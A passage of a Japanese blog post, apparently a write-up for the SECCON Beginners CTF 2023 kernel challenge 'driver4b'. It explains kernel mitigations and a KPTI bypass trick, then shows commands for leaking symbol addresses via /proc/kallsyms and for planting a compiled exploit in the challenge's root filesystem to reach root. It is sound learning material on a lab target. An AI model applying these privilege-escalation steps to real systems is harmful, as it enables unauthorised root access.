              srcset="/static/62777bfb814d8f36b94eb1022fc957e1/8ac56/image-20230606215544180.webp 240w,
/static/62777bfb814d8f36b94eb1022fc957e1/c4642/image-20230606215544180.webp 395w"
              sizes="(max-width: 395px) 100vw, 395px"
              type="image/webp"
            />
          <source
            srcset="/static/62777bfb814d8f36b94eb1022fc957e1/8ff5a/image-20230606215544180.png 240w,
/static/62777bfb814d8f36b94eb1022fc957e1/2cb6c/image-20230606215544180.png 395w"
            sizes="(max-width: 395px) 100vw, 395px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/62777bfb814d8f36b94eb1022fc957e1/2cb6c/image-20230606215544180.png"
            alt="image-20230606215544180"
            title="image-20230606215544180"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="kaslrfgkaslr" style="position:relative;"><a href="#kaslrfgkaslr" aria-label="kaslrfgkaslr permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>KASLR、FGKASLR</h3>
<p>KASLR(Kernel Address Space Layout Randomization) は、ユーザ空間のプロセスの持つ ASLR のカーネル版のような機構で、Linux カーネルやデバイスドライバのコード領域とデータ領域のアドレスをランダム化します。</p>
<p>また、FGKASLR(Function Granular KASLR) は KASLR の強化版で、Linux カーネルの関数ごとにアドレスをランダム化できる機構で、特定の関数アドレスをリークしてもカーネルのベースアドレスを特定させないメリットがあるようです。</p>
<p>KASLR はデフォルトで有効ですが、Qemu 環境の場合は起動時の <code class="language-text">-append</code> オプションに <code class="language-text">nokaslr</code> が指定されていれば KASLR は無効化されいると判断できます。</p>
<p>今回の問題環境でも、以下のとおり KASLR は無効化されています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 616px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/2eec233266866668384d96022fbd3e71/40040/image-20230606220219457.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 43.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABEklEQVQoz52RW27DIBREs4+YNxgMNrZJpVatknb/m5oCNk5UqVLaj6MZkHW5Mz75uYe2ApRLcKkhlIY2CkrwAyMFdIYxBkpp1d84rZcF60uCjwnCJ0g7wgeHyRqMVlctDPmRpwYSpmDTFXZKCL2CZBTnrssQnAlBR+5K8rACfeDn3UkoAzW/ww4BX2vAWwyIztSIhRa7eLl7yXeOWgR425CrHn36hFtekUaHmOMtg60xZ9fD56ih15vPWmood6UCb8rZ1AWU5NtAJhT0MGOZJtj8UYtRIteYhFaa78g9ZjsXtshlQ+3gLjekGHFbAj7mgDXY48WnaR0yoWFcwJR/SOmJ124EBP/jwNZhM3SHPeh/+AaaYPurd3+aawAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/2eec233266866668384d96022fbd3e71/8ac56/image-20230606220219457.webp 240w,
/static/2eec233266866668384d96022fbd3e71/d3be9/image-20230606220219457.webp 480w,
/static/2eec233266866668384d96022fbd3e71/26c8a/image-20230606220219457.webp 616w"
              sizes="(max-width: 616px) 100vw, 616px"
              type="image/webp"
            />
          <source
            srcset="/static/2eec233266866668384d96022fbd3e71/8ff5a/image-20230606220219457.png 240w,
/static/2eec233266866668384d96022fbd3e71/e85cb/image-20230606220219457.png 480w,
/static/2eec233266866668384d96022fbd3e71/40040/image-20230606220219457.png 616w"
            sizes="(max-width: 616px) 100vw, 616px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/2eec233266866668384d96022fbd3e71/40040/image-20230606220219457.png"
            alt="image-20230606220219457"
            title="image-20230606220219457"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="kpti-kernel-page-table-isolation" style="position:relative;"><a href="#kpti-kernel-page-table-isolation" aria-label="kpti kernel page table isolation permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>KPTI (Kernel Page-Table Isolation)</h3>
<p>KPTI は仮想アドレスから物理アドレスに変換する際に利用するページテーブルをユーザモードとカーネルモードで分離する機構です。</p>
<p>これにより、カーネル空間のメモリをユーザー権限で参照する Meltdown 攻撃を防止します。</p>
<p>また、KPTI が有効な場合にはカーネル空間から ROP する場合にユーザ空間に ret した際にクラッシュが発生するようです。</p>
<p>これは、ユーザ空間に異動した際に KPTI が有効化されていると、ページディレクトリがカーネル空間のまま変わらず、ユーザー空間のページを参照できなくなることが原因で発生します。</p>
<p>KPTI の影響を回避するためには、ユーザ空間に戻る前に CR3 レジスタを 0x1000 で OR する必要があるようです。</p>
<p>このような処理は <a href="https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S#L570" target="_blank" rel="nofollow noopener noreferrer">swapgs<em>restore</em>regs<em>and</em>return<em>to</em>usermode</a> マクロの処理で実装されているようです。</p>
<p>このマクロのアドレスは、<code class="language-text">/proc/kallsyms</code> の出力結果から以下のようにして特定できます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># swapgs_restore_regs_and_return_to_usermode のアドレスを特定</span>
<span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> swapgs_restore_regs_and_return_to_usermode</code></pre></div>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html" target="_blank" rel="nofollow noopener noreferrer">Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</a></p>
<p>KPTI は、 Qemu 環境の場合は起動時の <code class="language-text">-append</code> オプションに <code class="language-text">pti=on</code> が指定されていれば有効化されいると判断できます。</p>
<p>今回の問題環境では KPTI は有効化されています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 611px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/587ed7c581bf66b3276831d9a235cfd9/36bb5/image-20230606221608271.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 42.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQoz5VR2VLDMAzMd7SJT9nxkTjkKLRPPPD/37TYTmAKM2XKw44sWV7tyo0fLNLsoEhCaAdpPKjv4Syh1wo97fCkoaUAYwyc84donDNIy4plu8DEGcJG6EwYcj1kEm92BPMkIS8NFEHTDSFEjFah1E7nFqe2qzgfse06dPmu7ViN3RG/6mVYIwWHDjP0/I51jPhYE24pYPIW7lBos/USS17OLq/AKFlXUfJgCJTzqlBkQpltmnRFGKbaVJrdnd1/ERaFsh8R0oYtK4x2f8T4bqX9tsV+nB9bzqwqLIgvr3gbfbbrcRkcYk8o6jnjf37CPSqhEAJCESxRtdGyfeqzJL/xCe9z4HtTX7oYAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/587ed7c581bf66b3276831d9a235cfd9/8ac56/image-20230606221608271.webp 240w,
/static/587ed7c581bf66b3276831d9a235cfd9/d3be9/image-20230606221608271.webp 480w,
/static/587ed7c581bf66b3276831d9a235cfd9/ef8bf/image-20230606221608271.webp 611w"
              sizes="(max-width: 611px) 100vw, 611px"
              type="image/webp"
            />
          <source
            srcset="/static/587ed7c581bf66b3276831d9a235cfd9/8ff5a/image-20230606221608271.png 240w,
/static/587ed7c581bf66b3276831d9a235cfd9/e85cb/image-20230606221608271.png 480w,
/static/587ed7c581bf66b3276831d9a235cfd9/36bb5/image-20230606221608271.png 611w"
            sizes="(max-width: 611px) 100vw, 611px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/587ed7c581bf66b3276831d9a235cfd9/36bb5/image-20230606221608271.png"
            alt="image-20230606221608271"
            title="image-20230606221608271"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="kadr-kernel-address-display-restriction" style="position:relative;"><a href="#kadr-kernel-address-display-restriction" aria-label="kadr kernel address display restriction permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>KADR (Kernel Address Display Restriction)</h3>
<p>後述する通り、Linux カーネルの関数の名前とアドレスは <code class="language-text">/proc/kallsyms</code> などから参照することができますが、KADR が有効化されている場合カーネル空間の関数やデータ、ヒープなどのアドレス情報のリークが防止されます。</p>
<h2 id="カーネルエクスプロイト問のアプローチ" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E5%95%8F%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AD%E3%83%BC%E3%83%81" aria-label="カーネルエクスプロイト問のアプローチ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルエクスプロイト問のアプローチ</h2>
<p>※ あくまでカーネルエクスプロイトに入門する人間が初めて学んだ内容のメモなので、内容の網羅性は保証しません。</p>
<h3 id="カーネルメモリ空間のアドレスを特定する" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E7%A9%BA%E9%96%93%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B" aria-label="カーネルメモリ空間のアドレスを特定する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルメモリ空間のアドレスを特定する</h3>
<p>カーネルメモリ空間のアドレスは、<code class="language-text">/proc/kallsyms</code> の出力などから特定することができます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># kASLR が無効化されていればアドレスは固定になる</span>
<span class="token function">cat</span> /proc/kallsyms</code></pre></div>
<p>前述の KASLR が無効化されていれば、ここで特定したアドレスをそのままエクスプロイトに利用することが可能ですが、 KASLR が有効な場合このアドレスは使用できないので、実行中のカーネルなどからリークさせる必要があります。</p>
<h3 id="bazimage-から-vmlinux-を取得する" style="position:relative;"><a href="#bazimage-%E3%81%8B%E3%82%89-vmlinux-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B" aria-label="bazimage から vmlinux を取得する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>bazImage から vmlinux を取得する</h3>
<p>vmlinux は、内部にLinuxカーネル本体を包含する静的リンクされた実行ファイル(ELF)です。</p>
<p>今回の問題バイナリの場合、bzImage という vmlinux を圧縮した形式のファイルが与えられるため、<code class="language-text">extract-vmlinux</code> で vmlinux を展開しておきます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># bzImage を展開する</span>
<span class="token function">wget</span> https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
<span class="token function">chmod</span> +x extract-vmlinux
./extract-vmlinux bzImage <span class="token operator">></span> vmlinux</code></pre></div>
<p>vmlinux  を展開することで、gdb へのロードやガジェットの探索などを行えるようになります。</p>
<h3 id="ファイルシステムを編集してバイナリを配置する" style="position:relative;"><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E7%B7%A8%E9%9B%86%E3%81%97%E3%81%A6%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92%E9%85%8D%E7%BD%AE%E3%81%99%E3%82%8B" aria-label="ファイルシステムを編集してバイナリを配置する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ファイルシステムを編集してバイナリを配置する</h3>
<p>問題を解く際に、与えられた rootfs.cpio を展開して問題ファイルを埋め込みたい場合があります。</p>
<p>その場合は、root ユーザで以下のようなコマンドを実行します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># cpio ファイルを展開する(root)</span>
<span class="token function">mkdir</span> root
<span class="token builtin class-name">cd</span> root<span class="token punctuation">;</span> cpio -idv <span class="token operator">&lt;</span> <span class="token punctuation">..</span>/rootfs.cpio

<span class="token comment"># エクスプロイトの配置</span>
gcc -static <span class="token punctuation">..</span>/pwn.c -o ./pwn

<span class="token comment"># Exploitの配置後(root)</span>
<span class="token function">find</span> <span class="token builtin class-name">.</span> -print0 <span class="token operator">|</span> cpio -o --format<span class="token operator">=</span>newc --null <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio</code></pre></div>
<p>詳細については以下が参考になりました。</p>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/introduction/compile-and-transfer.html" target="_blank" rel="nofollow noopener noreferrer">コンパイルとexploitの転送 | PAWNYABLE!</a></p>
<h2 id="driver4bpwn" style="position:relative;"><a href="#driver4bpwn" aria-label="driver4bpwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>driver4b(Pwn)</h2>
<blockquote>
<p>This is an introduction to Linux Kernel driver programming and exploitation.</p>
</blockquote>
<p>これで最低限の背景知識を整理できたかと思うので、いよいよ driver4b の問題をちゃんと解いていきます。</p>
<h3 id="問題の概要について" style="position:relative;"><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6" aria-label="問題の概要について permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>問題の概要について</h3>
<p>問題サーバに nc でアクセスすると、最初に hashcash で生成したトークンを求められ、ローカル端末で生成したトークンを入力し、認証を行うと問題マシンのシェルにアクセスできるようになります。</p>
<p>この時アクセスできるシェルは、問題バイナリとして与えられた <code class="language-text">release/run.sh</code> で起動した環境と同等のようです。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">timeout</span> --foreground <span class="token number">300</span> qemu-system-x86_64 <span class="token punctuation">\</span>
    -m 64M <span class="token punctuation">\</span>
    -nographic <span class="token punctuation">\</span>
    -kernel bzImage <span class="token punctuation">\</span>
    -initrd rootfs.cpio <span class="token punctuation">\</span>
    -append <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on nokaslr"</span> <span class="token punctuation">\</span>
    -no-reboot <span class="token punctuation">\</span>
    -cpu kvm64 <span class="token punctuation">\</span>
    -monitor /dev/null <span class="token punctuation">\</span>
    -net nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>
    -net user</code></pre></div>
<p>実際にシェルにアクセスすると、x86_64 のバニラ Linux に通常ユーザ権限で、インターネットに接続可能な環境であることがわかります。(HTTPS 接続はできず、wget コマンドによるファイル取得は HTTP に対してのみ有効に動作する。)</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 926px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b321a27d0fc71e1a458679501341c0e5/69476/image-20230607005642037.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 76.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB80lEQVQ4y52Ta1PaYBCF80nb6tRe1OrYVqHigJIQIEAitwQINxER8FKt7fT//4jTPduK5dIO7Yed5M0kT845u2tcF3oY57q4yp/hIhUi//oY5koE9toh7Be/Su7T6zGk12JPz6RSzz9NnVnG1+AKd8UB7stDjLIdXFgNqVDhjegpmodFVPayKO2m4byMI7lyAHM1Ams1OoH+DjYe/DEGdlOBd6VL3FeGuPH6Cu+dBGgfldGSakQ9hfsfcii+s+G+TSL1LDqv8MY9R99sKLQZK6EgL+ZeJeSjFE63LbibJrwtC4U3J3r2tkyUdzPw5Ln1JyBVsIL9PDLrR2ppqiRTfvx0/ml7oeVvtWsQ+llyvBWrtKmZ7aTVHrMLPua1KbNqFjZllG3j7NjH2OniMt1S6zwzL0JpfxawCDQBcmw4MlTJZhA8lJ9ox6XTLcm1HnFV6d9AE+CX6giEfg9v8SD3nEla78v41PYLcDbiU6DZzOaAVMTZI5SKuglfYVTciVdR3XOWUjYBDjNtzW7kdMR6T/ILFDiwQwFWNMN/AoYSPrvI4gAzL84i545r+Ghx2TK4XlRZOyhoZwnlPbdBt2LHXlqdKjw369plrhYhrOp7R/e4HvEQypXN4WzyB9ySx93mc1/epQA6czeTMGgrt5GYm/z/rR/oDcUoFDqrTgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b321a27d0fc71e1a458679501341c0e5/8ac56/image-20230607005642037.webp 240w,
/static/b321a27d0fc71e1a458679501341c0e5/d3be9/image-20230607005642037.webp 480w,
/static/b321a27d0fc71e1a458679501341c0e5/dafe9/image-20230607005642037.webp 926w"
              sizes="(max-width: 926px) 100vw, 926px"
              type="image/webp"
            />
          <source
            srcset="/static/b321a27d0fc71e1a458679501341c0e5/8ff5a/image-20230607005642037.png 240w,
/static/b321a27d0fc71e1a458679501341c0e5/e85cb/image-20230607005642037.png 480w,
/static/b321a27d0fc71e1a458679501341c0e5/69476/image-20230607005642037.png 926w"
            sizes="(max-width: 926px) 100vw, 926px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b321a27d0fc71e1a458679501341c0e5/69476/image-20230607005642037.png"
            alt="image-20230607005642037"
            title="image-20230607005642037"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>続いて、root 権限でシェルを起動可能な <code class="language-text">debug/debug.sh</code>  を使用してシェルを起動し、dmesg コマンドの結果を確認したところ、<code class="language-text">ctf4b: loading out-of-tree module taints kernel.</code> というメッセージが表示されていることがわかります。</p>
<p>また、ps コマンドを発行すると <code class="language-text">{S99ctf} /bin/sh /etc/init.d/S99ctf start</code>というプロセスが稼働していることがわかります。</p>
<p>ここで、<code class="language-text">/etc/init.d/S99ctf</code> は以下のようなスクリプトでした。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token comment"># Setup</span>
mdev -s
<span class="token function">mount</span> -t proc none /proc
stty -opost

<span class="token comment"># Install kernel driver</span>
insmod /root/ctf4b.ko
<span class="token function">mknod</span> -m <span class="token number">666</span> /dev/ctf4b c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> ctf4b /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1;}'</span><span class="token variable">`</span></span> <span class="token number">0</span>

<span class="token comment"># User shell</span>
<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> -f1 /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[ Welcome to SECCON Beginners CTF 2023 ]"</span>
setsid cttyhack setuidgid <span class="token number">0</span> <span class="token function">sh</span>

<span class="token comment"># Cleanup</span>
<span class="token function">umount</span> /proc
poweroff -d <span class="token number">0</span> -f</code></pre></div>
<p>上記を確認すると、<code class="language-text">/root/ctf4b.ko</code> のデバイスドライバを insmod コマンドでロードした後、<code class="language-text">/dev/ctf4b</code> というキャラクタデバイスを作成して割り当てていることがわかります。</p>
<p>以下のコマンドを実行してみるとカーネルのメモリ空間に ctf4b がロードされていることが確認できます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> ctf4b
<span class="token operator">></span>
ffffffffc0000010 t module_open  <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc0000030 t module_ioctl <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc00000e0 t module_cleanup       <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc00000c0 t module_close <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc0000000 t __pfx_module_open    <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc0000020 t __pfx_module_ioctl   <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc00000b0 t __pfx_module_close   <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc00000e0 t cleanup_module       <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span>
ffffffffc00000d0 t __pfx_cleanup_module <span class="token punctuation">[</span>ctf4b<span class="token punctuation">]</span></code></pre></div>
<p>さらに、この <code class="language-text">ctf4b.ko</code> が存在するディレクトリを調べると、 root ディレクトリに flag.txt というファイルが配置されていることがわかります。</p>
<p>つまり、今回の問題はデバイスドライバの脆弱性を悪用することで root 権限を取得し、flag.txt を読み出す必要があることがわかります。</p>
<h3 id="デバイスドライバを調べる" style="position:relative;"><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B" aria-label="デバイスドライバを調べる permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>デバイスドライバを調べる</h3>
<p>今回の問題バイナリである <code class="language-text">ctf4b.ko</code> については、ありがたいことにソースコードが問題バイナリとして与えられています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// ctf4b.h</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_DEVICE_NAME</span> <span class="token string">"ctf4b"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_STORE</span> <span class="token expression"><span class="token number">0xC7F4B00</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_LOAD</span>  <span class="token expression"><span class="token number">0xC7F4B01</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_MSG_SIZE</span> <span class="token expression"><span class="token number">0x100</span></span></span>

<span class="token comment">// ctf4b.c</span>
